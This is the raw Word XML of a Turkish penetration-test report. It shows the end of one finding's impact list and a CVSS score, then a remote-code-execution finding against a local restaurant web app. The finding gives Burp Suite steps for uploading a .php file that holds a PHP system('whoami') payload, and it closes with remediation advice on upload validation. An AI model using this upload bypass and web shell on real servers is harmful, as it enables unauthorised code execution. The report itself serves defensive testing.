              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="79903C23" w14:textId="0FAB8B9B" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Veri Bütünlüğünün İhlali:</w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Saldırgan, verileri değiştirebilir veya silebilir, bu da veri bütünlüğünü ciddi şekilde etkileyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12A81EB3" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2D6003E0" w14:textId="56381D1E" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Hizmet Durdurma: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, sistem kaynaklarını aşırı şekilde kullanarak hedef sistemin hizmet dışı kalmasına neden olabilir (DoS/DDoS saldırıları).</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E964ABC" w14:textId="77777777" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="57817746" w14:textId="67A56BF1" w:rsidR="00991F03" w:rsidRPr="00991F03" w:rsidRDefault="00991F03" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Sistem İzleme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde gizlice izleme yaparak kullanıcıların etkinliklerini gözlemleyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43E7BAC1" w14:textId="6B0018D7" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00BF4DE0">
            <w:pPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w:rsidRPr="00402B96" w14:paraId="20EA8E5E" w14:textId="77777777" w:rsidTr="00BF4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51681496" w14:textId="0E6496B7" w:rsidR="00BF4DE0" w:rsidRDefault="00BF4DE0" w:rsidP="00BF4DE0">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF4DE0" w:rsidRPr="00402B96" w14:paraId="25FD33FE" w14:textId="77777777" w:rsidTr="00BF4DE0">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="6C30C4DD" w14:textId="063F698D" w:rsidR="00BF4DE0" w:rsidRPr="00C361DB" w:rsidRDefault="00C361DB" w:rsidP="00C361DB">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:t>8.8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB3D05" w:rsidRPr="00402B96" w14:paraId="5B62637B" w14:textId="77777777" w:rsidTr="00CB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49C310A5" w14:textId="07CC356F" w:rsidR="00CB3D05" w:rsidRPr="00402B96" w:rsidRDefault="00CB3D05" w:rsidP="00CB3D05">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7483C4CD" w14:textId="77777777" w:rsidR="00653376" w:rsidRDefault="00653376"/>
    <w:p w14:paraId="41638D02" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31"/>
    <w:p w14:paraId="6CB32521" w14:textId="2F5EEE62" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="006D1C31">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2) </w:t>
      </w:r>
      <w:r w:rsidRPr="006D1C31">
        <w:t>Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37859AB8" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="006D1C31"/>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="006D1C31" w14:paraId="6FF61B8F" w14:textId="77777777" w:rsidTr="005C66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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52E9D751" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w14:paraId="50CE019A" w14:textId="77777777" w:rsidTr="005C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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4F8C34AF" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Remote Code Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w14:paraId="16B3523C" w14:textId="77777777" w:rsidTr="005C66ED">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A205D98" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00057867" w14:paraId="781B657C" w14:textId="77777777" w:rsidTr="005C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78667C3E" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EB95C6C" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00057867" w14:paraId="25A3FDEA" w14:textId="77777777" w:rsidTr="005C66ED">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4E114679" w14:textId="0DEF6651" w:rsidR="006D1C31" w:rsidRPr="00EE6B0D" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId11" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r w:rsidR="00986042">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> firma</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId12" w:history="1">
              <w:r w:rsidR="002239E8" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_add_restaurant.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="002239E8">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. </w:t>
            </w:r>
            <w:r w:rsidR="002239E8">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Restaurant</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> resmi seçin butonuna tıklanır ve test.jpg dosyası sistemi yüklenir ve istek </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ve isteğe sağ tıklanıp “send to repeater” seçeneği seçilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07C976B0" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="56DAF289" w14:textId="72B0E896" w:rsidR="006D1C31" w:rsidRDefault="002239E8" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4BFCB5D1" wp14:editId="75810BDC">
                  <wp:extent cx="5713730" cy="2694940"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="1174633452"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3730" cy="2694940"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="28975F3E" w14:textId="14D5868E" w:rsidR="006D1C31" w:rsidRPr="00C361DB" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="002239E8">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="522D8F76" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="38E575B6" w14:textId="082A73E8" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Dosya uzantısı .php ile değiştirilir ve </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>Content-Disposition: form-data; name="update_profile_picture"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Header’ının altına </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>“&lt;?php $value = system("</w:t>
            </w:r>
            <w:r w:rsidR="002239E8">
              <w:t>whoami</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>");  echo $value; ?&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>bu payload yazılır. Ardından istek gönderilir.</w:t>
            </w:r>
            <w:r w:rsidR="00986042">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Sistemden çıkış yapılır ve </w:t>
            </w:r>
            <w:hyperlink r:id="rId14" w:history="1">
              <w:r w:rsidR="00986042" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="00986042">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00986042" w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r w:rsidR="00986042">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> müşteri</w:t>
            </w:r>
            <w:r w:rsidR="00986042" w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r w:rsidR="00986042">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId15" w:history="1">
              <w:r w:rsidR="00986042" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_restaurants.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="00986042">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilip seçilen restauran’ın &lt;img&gt; etiketi içinde </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> yüklenen dosyanın konumu bulunur. Bulunan konuma (</w:t>
            </w:r>
            <w:hyperlink r:id="rId16" w:history="1">
              <w:r w:rsidR="00F86F2E" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/uploads/restaurant_images/66fee861dc801_test.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="00F86F2E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>) istek atılır. Böyle başarıyla sunucu üzerinde uzaktan kod yürütülür.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55E1AAC5" w14:textId="5CD62A1B" w:rsidR="006D1C31" w:rsidRDefault="00F86F2E" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F86F2E">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F1A4074" wp14:editId="4D27522B">
                  <wp:extent cx="5713730" cy="1622425"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="19697878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78782" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId17"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="1622425"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D6137BC" w14:textId="37E7D5D3" w:rsidR="006D1C31" w:rsidRPr="00CF0A67" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="00F86F2E">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Elde </w:t>
            </w:r>
            <w:r w:rsidR="00CD5762">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Edilen Komutun Response’u</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00057867" w14:paraId="7AB97F0D" w14:textId="77777777" w:rsidTr="005C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1F50D2F3" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00057867" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00D60321" w14:paraId="798112B4" w14:textId="77777777" w:rsidTr="005C66ED">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="394C2091" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve">  Dosya Türü Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="388A247B" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklemeye izin verilen dosya türlerini sınırlayın. Sadece belirli dosya türlerine (örneğin, .jpg, .png, .pdf) izin verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26A6594D" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Dosya uzantılarını kontrol etmek yeterli değildir; dosya içeriğini de doğrulamak için MIME türü kontrolü yapın</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56BCB7E9" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve"> Dosya Boyutu Sınırlaması:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20E856CA" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="12"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların boyutunu sınırlayın. Belirli bir boyutun üzerinde dosya yüklemeyi engelleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C564180" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>Dosya İsimleri Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="641B953A" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların isimlerini güvenli hale getirin. Dosya isimlerindeki özel karakterleri temizleyin ve dosya isimlerini standart bir formatta düzenleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1138C816" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00BF4DE0" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
